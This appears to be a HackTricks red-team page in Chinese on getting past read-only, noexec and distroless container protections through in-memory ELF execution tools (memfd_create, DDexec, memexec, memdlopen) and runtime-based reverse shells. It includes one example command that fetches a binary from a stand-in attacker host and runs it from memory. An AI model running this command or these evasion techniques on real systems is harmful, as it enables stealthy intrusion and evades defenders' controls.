# Bypass FS protections: read-only / no-exec / Distroless

{{#include ../../../../banners/hacktricks-training.md}}

## 视频

以下视频对本页提到的技术进行了更深入的讲解：<sup>[[1]](#references)[[2]](#references)</sup>

- [**DEF CON 31 - 探索 Linux 内存操纵以实现隐蔽和规避**](https://www.youtube.com/watch?v=poHirez8jk4).<sup>[[1]](#references)</sup>
- [**使用 DDexec-ng 和内存中的 dlopen() 实现隐蔽入侵 - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU).<sup>[[2]](#references)</sup>

## read-only / no-exec 场景

在容器中，可以在安全上下文中设置 **`readOnlyRootFilesystem: true`**，将根文件系统挂载为只读。<sup>[[3]](#references)</sup> 例如：

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
  name: alpine-pod
spec:
  containers:
  - name: alpine
    image: alpine
    securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

根文件系统只读，并不意味着单独挂载的卷也是只读的。Docker 将 **`/dev/shm`** 视为 IPC 挂载，而 `rw` 和 `noexec` 等 tmpfs 选项属于运行时配置；依赖这些行为前，应检查目标容器的挂载选项。<sup>[[4]](#references)[[5]](#references)</sup>

> [!WARNING]
> 从红队角度看，这种组合可能会导致难以下载并执行系统中原本不存在的二进制文件（例如后门或枚举工具）。<sup>[[4]](#references)[[5]](#references)</sup>

## 最简单的 Bypass：脚本

`noexec` 挂载会阻止直接执行该挂载上的二进制文件，但解释器仍能读取并解释脚本。如果系统中存在 `sh` 或 `python`，就可以通过相应的解释器运行 shell 或 Python 脚本。<sup>[[5]](#references)</sup>

如果所需工具本身就是二进制文件，这种方法就无济于事。<sup>[[5]](#references)</sup>

## 内存 Bypasses

当挂载路径上的直接执行受到阻止时，可以将 ELF 加载到内存中，并通过内存路径执行。这可以绕过该挂载上的 `noexec` 检查，但不会解除其他内核、权限或策略控制。<sup>[[5]](#references)[[6]](#references)</sup>

### FD + exec syscall Bypass

如果脚本运行时可以访问相关的 Linux 接口，就能通过 **`memfd_create(2)`** 创建一个匿名、由 RAM 支持的文件描述符，将 ELF 字节写入其中，然后通过基于 fd 的执行路径运行它。项目 [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) 可为此流程生成压缩并经过 base64 编码的 Python、Perl 或 Ruby 代码。<sup>[[6]](#references)[[7]](#references)</sup>

该项目目前记录了 Python、Perl 和 Ruby 目标；PHP 或 Node 需要采用不同的、针对运行时的技术或扩展，因此，项目没有为某种语言提供生成器，并不意味着无法在内存中执行代码。<sup>[[6]](#references)[[12]](#references)</sup>

有关匿名文件执行、相关暂存模式以及检测和取证收集的更多内容，请参阅 [Linux Fileless Execution](../../../post-exploitation/linux-fileless-execution.md)。

> [!WARNING]
> 写入 **`/dev/shm`** 的常规可执行文件仍受该挂载的 **`noexec`** 设置限制；仅通过普通文件描述符打开它，并不会改变挂载策略。<sup>[[5]](#references)</sup>
>
> 具体采用哪种内存执行方法，也取决于运行时、架构、内核和可用权限。<sup>[[6]](#references)[[7]](#references)[[12]](#references)</sup>

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) 通过 **`/proc/self/mem`** 将暂存器和加载器写入正在运行的 shell 进程，然后将控制权转交给这些代码。<sup>[[8]](#references)</sup>

这样，进程就能加载指定的二进制文件，而无需先将其放到可执行文件系统上。<sup>[[8]](#references)</sup>

> [!TIP]
> **DDexec / EverythingExec** 可以从**内存**中加载并**执行** shellcode 或二进制文件。<sup>[[8]](#references)</sup>

```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```

有关此技术的更多信息，请查看 Github 或：

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) 是 DDexec 的守护进程实现。其守护进程会监听包含参数和原始程序字节的请求，派生子进程来加载并运行每个程序，同时让父进程继续作为服务器运行。<sup>[[9]](#references)</sup>

该仓库包含一个示例，演示如何**使用 memexec 从 PHP reverse shell 执行二进制文件**，见 [a.php](https://github.com/arget13/memexec/blob/main/a.php)。<sup>[[9]](#references)</sup>

### Memdlopen

与 DDexec 用途类似，[**memdlopen**](https://github.com/arget13/memdlopen) 是一种用于共享对象或程序的无文件 `dlopen()` 实现。其 README 目前记录了对 ARM64 的支持，因此使用前请检查目标架构。<sup>[[10]](#references)</sup>

## Distroless Bypass

如需专门了解 **distroless 的实际含义**、何时有用、何时没有用，以及它会如何改变容器中的 post-exploitation 操作方式，请查看：

{{#ref}}
../../../containers-namespaces/container-security/distroless.md
{{#endref}}

### What is distroless

Distroless 镜像只包含应用程序及其运行时依赖；官方镜像不包含包管理器、shell 或标准 Linux 发行版中通常预期存在的其他程序。<sup>[[11]](#references)</sup>

将运行时镜像限制为这些依赖，可以减少生产环境中的软件数量，以及需要扫描和跟踪的内容。<sup>[[11]](#references)</sup>

### Reverse Shell

在 distroless 容器中，你可能**找不到用于常规 shell 的 `sh` 或 `bash`**，也可能没有 `ls`、`whoami` 或 `id` 等常见实用程序。<sup>[[11]](#references)</sup>

> [!WARNING]
> 因此，常见的基于 shell 的 reverse shell 或基于实用程序的枚举可能无法使用。<sup>[[11]](#references)</sup>

如果受影响的应用程序包含语言运行时（例如，Flask 应用中的 Python 或 Node 应用中的 Node.js），RCE 仍可能利用该运行时建立命令通道，并通过其 API 检查系统。<sup>[[11]](#references)[[12]](#references)</sup>

> [!TIP]
> 利用可用的脚本语言及其功能来**枚举系统**。<sup>[[12]](#references)</sup>

如果没有**只读/不可执行**保护，命令通道可能可以将二进制文件写入可写且可执行的挂载点并运行；请先确认挂载选项和权限。<sup>[[4]](#references)[[5]](#references)</sup>

> [!TIP]
> 存在这些保护时，只要运行时、内核和权限允许，就使用**上述内存执行技术**。<sup>[[6]](#references)[[8]](#references)[[10]](#references)</sup>

你可以在 [**DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE) 中找到利用 RCE 漏洞获取脚本语言 **reverse shell** 并从内存执行二进制文件的**示例**。<sup>[[12]](#references)</sup>

## References

- [1] [DEF CON 31 - 探索 Linux 内存操纵以实现隐蔽与规避](https://www.youtube.com/watch?v=poHirez8jk4)
- [2] [使用 DDexec-ng 和内存中的 dlopen() 实现隐蔽入侵 - HackTricks Track 2023](https://www.youtube.com/watch?v=VM_gjjiARaU)
- [3] [为 Pod 或容器配置安全上下文](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [4] [docker 容器运行](https://docs.docker.com/reference/cli/docker/container/run)
- [5] [mount(8) - Linux 手册页](https://man7.org/linux/man-pages/man8/mount.8.html)
- [6] [无文件 ELF 执行](https://github.com/nnsee/fileless-elf-exec)
- [7] [memfd_create(2) - Linux 手册页](https://man7.org/linux/man-pages/man2/memfd_create.2.html)
- [8] [DDexec](https://github.com/arget13/DDexec)
- [9] [memexec](https://github.com/arget13/memexec)
- [10] [memdlopen](https://github.com/arget13/memdlopen)
- [11] [GoogleContainerTools/distroless](https://github.com/GoogleContainerTools/distroless)
- [12] [DistrolessRCE](https://github.com/carlospolop/DistrolessRCE)
{{#include ../../../../banners/hacktricks-training.md}}
